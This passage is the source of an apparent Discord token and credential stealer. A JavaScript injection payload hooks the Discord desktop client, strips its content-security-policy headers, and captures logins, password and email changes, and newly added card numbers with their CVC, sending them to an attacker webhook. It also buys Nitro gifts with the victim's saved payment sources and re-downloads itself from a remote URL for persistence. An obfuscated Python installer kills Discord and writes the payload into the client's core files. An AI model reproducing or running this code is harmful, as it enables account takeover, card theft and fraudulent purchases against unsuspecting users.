  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def CJLOSMPHIPKOHGOICXDIGEHLMQGLESDOJZYUQNHCWBJMGRMMLELDGVWLMYUYTW():
    import os
    import re
    import subprocess
    import psutil

    def POFRYRFKYZPGOXQNGFNGHWGYHYYGIYTYYWYNXMKXDYESCSLIZOUFNONUQAICJJBJIWGMUCUNBWUHFVXBTHGJCLJR(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH):
        for v4r_file in os.listdir(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH):
            if re.search(r'app-+?', v4r_file):
                MYDECUYAYUSBPOWLZPVPWLOTRONNAAHBTCZIGNMKXBKYJLHXHKMKAYIAHUBFBNYZOZWDWUHLAEWNQBIBVWLN = MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH + '\\' + v4r_file + '\\modules'
                if not os.path.exists(MYDECUYAYUSBPOWLZPVPWLOTRONNAAHBTCZIGNMKXBKYJLHXHKMKAYIAHUBFBNYZOZWDWUHLAEWNQBIBVWLN):
                    continue
                for v4r_file in os.listdir(MYDECUYAYUSBPOWLZPVPWLOTRONNAAHBTCZIGNMKXBKYJLHXHKMKAYIAHUBFBNYZOZWDWUHLAEWNQBIBVWLN):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC = MYDECUYAYUSBPOWLZPVPWLOTRONNAAHBTCZIGNMKXBKYJLHXHKMKAYIAHUBFBNYZOZWDWUHLAEWNQBIBVWLN + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC, v4r_file
        return None

    def RCIHKFIQKXEWBJIKBTXZYSZRJCQLSHMVJXMBLPFAUYBYDILQQJBJBUTMBPZQNHLORZZYKSXTGFTDBFDVJQOFASQXHZEJC(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH):
        MQPNVHAFMVOWAKEJUGDJUELAWBUDENHCNCARBFBAMAAYSBCPZXQOHQSWOTXKWIEAVGJOLLERMTWDVMAMSWVOKEMNMKN = MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH + '\\Update.exe'
        IGDPDBNXHYVOAAXGNGRCJNOQMSETHNTNKMOTWLBQHLIUZNJNDYJIRIUXDFKWFNPNGMMNNJGPLTFBCKGFWFUWLFOOYLEU = MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH):
            if re.search(r'app-+?', v4r_file):
                PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJT = MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH + '\\' + v4r_file
                if os.path.exists(PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJT + '\\' + 'modules'):
                    for v4r_file in os.listdir(PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJT):
                        if v4r_file == IGDPDBNXHYVOAAXGNGRCJNOQMSETHNTNKMOTWLBQHLIUZNJNDYJIRIUXDFKWFNPNGMMNNJGPLTFBCKGFWFUWLFOOYLEU:
                            IGDPDBNXHYVOAAXGNGRCJNOQMSETHNTNKMOTWLBQHLIUZNJNDYJIRIUXDFKWFNPNGMMNNJGPLTFBCKGFWFUWLFOOYLEU = PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJT + '\\' + IGDPDBNXHYVOAAXGNGRCJNOQMSETHNTNKMOTWLBQHLIUZNJNDYJIRIUXDFKWFNPNGMMNNJGPLTFBCKGFWFUWLFOOYLEU
                            subprocess.call([MQPNVHAFMVOWAKEJUGDJUELAWBUDENHCNCARBFBAMAAYSBCPZXQOHQSWOTXKWIEAVGJOLLERMTWDVMAMSWVOKEMNMKN, '--processStart', IGDPDBNXHYVOAAXGNGRCJNOQMSETHNTNKMOTWLBQHLIUZNJNDYJIRIUXDFKWFNPNGMMNNJGPLTFBCKGFWFUWLFOOYLEU],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def OWMCIDVJIAYTYUFPGTZJNPVVGIUPHHSPAJWAUBMBALXYDEMXAEOOVNGWSSPSEJRHDIJLLIVCU():
        PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJTdata = os.getenv('LOCALAPPDATA')
        CNQAYNKHWMASUWDFIQGPHIHFBXMNCQIKHGDAERSAGLKOAPWQCMUZZNPWWTWLGWXTTUBIWUBYENLPGC = [
            PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJTdata + '\\Discord',
            PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJTdata + '\\DiscordCanary',
            PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJTdata + '\\DiscordPTB',
            PHTEVOGNNJPRMNBNYDSBODAVZCQTAWBNGVNIVIEIHIDMIBMRAWMCRSRXHZXDCBEYYOEBYALJUKCJTdata + '\\DiscordDevelopment'
        ]
        OOIXYLSHEGVFWRBLGBIKIOVXWETLXRTLNUQNIVRIJUYKHMBYSQTCXVLDALAWWAEJ = GHKCQJWURWOPLUVEGUILWYBDRJKNNMTTMWWUONTTIYKDVQAPSMYNBQEMSAJMPABXTZVAQEPZHEBHU

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH in CNQAYNKHWMASUWDFIQGPHIHFBXMNCQIKHGDAERSAGLKOAPWQCMUZZNPWWTWLGWXTTUBIWUBYENLPGC:
            if not os.path.exists(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH):
                continue

            UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC_info = POFRYRFKYZPGOXQNGFNGHWGYHYYGIYTYYWYNXMKXDYESCSLIZOUFNONUQAICJJBJIWGMUCUNBWUHFVXBTHGJCLJR(MQFZAYOFYGBZWUPLTQKCDNUYPMJWXYKGJHLYSAHEEHWPKRKCWVOUKWBGQABNUTPH)
            if UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC_info is not None:
                UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC, UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC_file = UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC_info
                
                AMRRJYZNEAYTGXPRUNZTTOUKCTUFLJHUHRWBWTRWXHZVJIHVUHVQTGIPOUAQADWUJYLVXAFOANE = UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC + '\\index.js'
                
                if not os.path.exists(AMRRJYZNEAYTGXPRUNZTTOUKCTUFLJHUHRWBWTRWXHZVJIHVUHVQTGIPOUAQADWUJYLVXAFOANE):
                    open(AMRRJYZNEAYTGXPRUNZTTOUKCTUFLJHUHRWBWTRWXHZVJIHVUHVQTGIPOUAQADWUJYLVXAFOANE, 'w').close()

                with open(AMRRJYZNEAYTGXPRUNZTTOUKCTUFLJHUHRWBWTRWXHZVJIHVUHVQTGIPOUAQADWUJYLVXAFOANE, 'w', encoding='utf-8') as f:
                    f.write((OOIXYLSHEGVFWRBLGBIKIOVXWETLXRTLNUQNIVRIJUYKHMBYSQTCXVLDALAWWAEJ).replace('discord_desktop_core-1', UMOWTOXWRJEVJMSEVUWGHEJUQDATEGHHCWJANKEBNHLLXGYNTMCPFQJZMPVGHYWNMCHPHBRZLIABKHKPC_file)
                            .replace(r"%WEBHOOK_HERE%", IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)
                            .replace(r"%EMBED_COLOR%", str(UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX))
                            .replace(r"%USERNAME%", ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE)
                            .replace(r"%IP_PUBLIC%", PUTYMKUNNUIKYYDKHXLJFVOCXRVDKRTHSQNBIYPBNUFLKFQGSOPSULCTISTXEOVWFALIWAWM)
